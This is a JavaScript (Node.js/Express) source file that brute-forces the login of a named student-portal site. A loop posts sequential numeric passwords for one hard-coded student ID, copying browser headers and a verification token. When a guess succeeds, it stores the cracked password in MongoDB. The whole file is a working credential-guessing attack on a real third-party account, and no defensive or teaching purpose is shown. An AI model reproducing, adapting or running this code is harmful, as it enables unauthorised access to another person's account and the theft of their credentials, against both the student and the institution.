import Password from "./PawwordSchema.js";
import mongoose from "mongoose";
import dotenv from 'dotenv'
import express from 'express'

dotenv.config({
    path: './.env'
});



const app = express()
const port = 3000

let i;

let isInitiated;

const username = 2412800;

const fail_url = "https://agclms.in/Elogin/StudentLogin";
const succ_url = "https://agclms.in/DashBoardStudent";

async function connectDB() {
    if (mongoose.connection.readyState === 0) {
        await mongoose.connect(`${process.env.MONGODB_URI}`);
        console.log("Connected to MongoDB");
    }
}


app.get('/', (req, res) => {
    if (isInitiated) res.send(`initiated, current check ${i}`)
    isInitiated = true;
    main();
    res.send('initiated')
})

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})



const main = async () => {
    for (i = 14283; i <= 9999999999; i++) {
        const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
            method: "POST",
            mode: "cors",
            credentials: "include",
            headers: {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8,pa;q=0.7",
                "Cache-Control": "max-age=0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Priority": "u=0, i",
                "Sec-CH-UA": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
                "Sec-CH-UA-Mobile": "?0",
                "Sec-CH-UA-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1"
            },
            referrer: "https://agclms.in/Elogin/StudentLogin",
            body: `StudentId=${username}&Password=${i}&__RequestVerificationToken=CfDJ8EGcQOKVmPxPgmkTQR1Nt1xZlljdfqydx_goZpY-8eK6PGI9dSU83xUAON_XfZR7SS3zwtYfEKuUdVvl0eO2ceA0z1NQMWy6UINOh4vKvH9iepplsONyNqGCQtKcvOQdoI_Zh1mLiaDP3UWbcPLgIMQ`
        })

        if (response.url == fail_url) {
            console.log(i);
        } else if (response.url == succ_url) {
            await connectDB();
            console.log("password : ", i);

            const password = new Password({
                password: i
            })

            await password.save()
            return;
        } else {
            console.log(response);
            return;
        }
    }

}